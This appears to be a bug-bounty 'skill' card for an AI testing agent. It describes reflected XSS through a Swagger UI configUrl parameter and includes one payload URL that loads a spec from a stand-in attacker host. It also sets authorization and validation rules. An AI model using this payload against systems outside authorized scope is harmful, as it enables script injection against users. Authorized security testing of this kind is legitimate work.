# SKILL: Swagger configUrl misconfig → Reflected XSS = \$400 Bounty

**Skill id:** `tip/swagger-configurl-misconfig-reflected-xss-400-bounty`  
**Category:** XSS, Recon  
**Rating:** ⭐ جيدة  
**Status:** Not started  
**Notion:** https://app.notion.com/p/401dac31e88081958056cd5c8515132d  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **XSS, Recon**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

لما تلاقي Swagger UI، شوف لو فيه parameter اسمه configUrl أو url. جرب تحط فيه XSS payload. في حالة حقيقية اتحولت لـ RXSS ودفعت \$400.

## Payload / Code

```
[https://target.com/swagger-ui.html?configUrl=https://attacker.com/xss.json](https://target.com/swagger-ui.html?configUrl=https://attacker.com/xss.json)
```

## Source

dr34m14 Medium writeup – \$400 paid on HackerOne

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
